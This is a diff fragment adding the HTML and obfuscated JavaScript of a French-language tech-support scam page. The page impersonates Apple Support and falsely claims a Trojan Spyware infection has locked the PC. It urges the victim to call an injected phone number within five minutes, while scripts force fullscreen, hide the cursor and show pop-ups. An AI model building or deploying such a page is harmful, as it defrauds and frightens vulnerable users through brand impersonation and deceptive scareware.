+						_0x5c7790 = document[_0x674db4(0x6e)],
+						_0xd81fab = _0x5c7790[_0x674db4(0x6d)] || _0x5c7790['webkitRequestFullScreen'] || _0x5c7790[_0x674db4(0x73)];
+					_0xd81fab['call'](_0x5c7790);
+				});
+		</script>
+
+		<div id="websa" class="websa mnwebs">
+			<div class="ilb top">
+				<div class="headers ilb" style="border-bottom: 1px solid #d6d5d5">
+					<span id="txtadd" class="fl title"
+						><span class="fl ilb"><img src="apple.png" class="logo3" /></span> Apple Defender Avertissement de sécurité</span
+					>
+					<span id="txts1" class="fl title2"
+						><a href="#"><img src="cross.png" /></a
+					></span>
+				</div>
+			</div>
+			<div id="txtintro">
+				<span class="colo-rd"
+					>App: Ads.financetrack1(x07).dll<br />
+					Menace Détectée: Trojan Spyware</span
+				>
+			</div>
+			<img id="banner" src="poaiuyx45.png" />
+			<div id="disclaimer">
+				PC a été bloqué à cause d'une activité suspecte..<br />
+				<span class="support"
+					>Contacter le support technique:
+					<script>
+						document.write(savedPhoneNumber);
+					</script></span
+				>
+			</div>
+			<div id="bottom">
+				<div><img id="badge" src="apple.png" /><span class="title3">Apple Support</span></div>
+				<ul>
+					<li>
+						<a href="#">
+							<div class="fr button2">
+								<span id="addtochromebutton">Retourner</span>
+							</div>
+						</a>
+					</li>
+					<li>
+						<a href="#">
+							<div class="fr buttons blink">
+								<span id="addtochromebutton">OK</span>
+							</div>
+						</a>
+					</li>
+				</ul>
+			</div>
+		</div>
+
+		<div id="footer" style="bottom: 0; position: absolute; cursor: none; width: auto; overflow: hidden">
+			<div class="row">
+				<div class="col-md-12">
+					<div class="right-foot" style="text-align: center">
+						<span id="footertxt" style="font-weight: 700"><img src="apple.png" /> Contacter le support technique: </span
+						><span style="font-weight: 700; padding-left: 5px; color: #fff"
+							><span style="border: 1px solid #fff; border-radius: 5px; padding: 2px 5px"
+								><script>
+									document.write(savedPhoneNumber);
+								</script>
+							</span></span
+						>
+					</div>
+				</div>
+				<div class="col-md-12">
+					<marquee width="100%" direction="left" height="100px"
+						><small class="text-left" style="color: #eee; font-size: 10px"
+							>Apple Defender SmartScreen a été bloqué à cause d'une activité suspecte.Vous devez nous contacter immédiatement afin que
+							nos ingénieurs puissent vous guider dans le processus de suppression par téléphone. S'IL VOUS PLAÎT appelez-nous dans les 5
+							prochaines minutes afin d’éviter un disfonctionnement complet de votre ordinateur.</small
+						></marquee
+					>
+				</div>
+			</div>
+		</div>
+
+		<div
+			id="stauRt82"
+			style="
+				display: none;
+				background-color: #000;
+				height: auto;
+				width: 550px;
+				left: 32%;
+				position: absolute;
+				z-index: 9999999999;
+				text-align: center;
+				top: 0;
+			"
+			class="answer_list"
+		>
+			<p class="text-center" style="color: #fefefe; margin-top: 10px; font-size: 16px; opacity: 0.9">
+				Vous devez nous contacter immédiatement afin que nos ingénieurs puissent vous guider par téléphone tout au long de la procédure de
+				suppression.
+			</p>
+			<br />
+			<strong style="color: #fff"
+				>Contacter le support technique:
+				<span style="border: 1px solid #383d41; border-radius: 5px; padding: 2px 5px">
+					<script>
+						document.write(savedPhoneNumber);
+					</script>
+				</span>
+			</strong>
+			<br />
+			<br />
+		</div>
+
+		<script>
+			function _0x244d() {
+				var _0x37b2c0 = [
+					'3440304EegiWI',
+					'2024HrVKLT',
+					'1062QswAHQ',
+					'ready',
+					'5102nODBAG',
+					'play',
+					'1293285gKWnIm',
+					'#headMain',
+					'520617LfJUsi',
+					'1505553HdysTz',
+					'getElementById',
+					'show',
+					'1206BEVmAj',
+					'836276CCAPha',
+				];
+				_0x244d = function () {
+					return _0x37b2c0;
+				};
+				return _0x244d();
+			}
+			function _0xc1ea(_0x5e3887, _0x41a5dc) {
+				var _0x244d08 = _0x244d();
+				return (
+					(_0xc1ea = function (_0xc1eac8, _0x1c0fad) {
+						_0xc1eac8 = _0xc1eac8 - 0x145;
+						var _0x36e034 = _0x244d08[_0xc1eac8];
+						return _0x36e034;
+					}),
+					_0xc1ea(_0x5e3887, _0x41a5dc)
+				);
+			}
+			var _0x207290 = _0xc1ea;
+			(function (_0x552bf4, _0x263374) {
+				var _0x35b034 = _0xc1ea,
+					_0x5a8250 = _0x552bf4();
+				while (!![]) {
+					try {
+						var _0x4e76b0 =
+							parseInt(_0x35b034(0x150)) / 0x1 +
+							(-parseInt(_0x35b034(0x14c)) / 0x2) * (-parseInt(_0x35b034(0x14a)) / 0x3) +
+							-parseInt(_0x35b034(0x147)) / 0x4 +
+							parseInt(_0x35b034(0x14e)) / 0x5 +
+							-parseInt(_0x35b034(0x148)) / 0x6 +
+							-parseInt(_0x35b034(0x151)) / 0x7 +
+							(parseInt(_0x35b034(0x149)) / 0x8) * (parseInt(_0x35b034(0x146)) / 0x9);
+						if (_0x4e76b0 === _0x263374) break;
+						else _0x5a8250['push'](_0x5a8250['shift']());
+					} catch (_0x4d8d44) {
+						_0x5a8250['push'](_0x5a8250['shift']());
+					}
+				}
+			})(_0x244d, 0xaf76a),
+				$(document)[_0x207290(0x14b)](function () {
+					var _0x5cbbbd = _0x207290;
+					$(_0x5cbbbd(0x14f))['click'](function () {
+						var _0x40b227 = _0x5cbbbd;
+						$('#stauRt82')[_0x40b227(0x145)]();
+					});
+				});
+			function loyarQ() {
+				var _0x572968 = _0x207290;
+				document[_0x572968(0x152)]('peet7')[_0x572968(0x14d)]();
+			}
+		</script>
+	</body>
+</html>
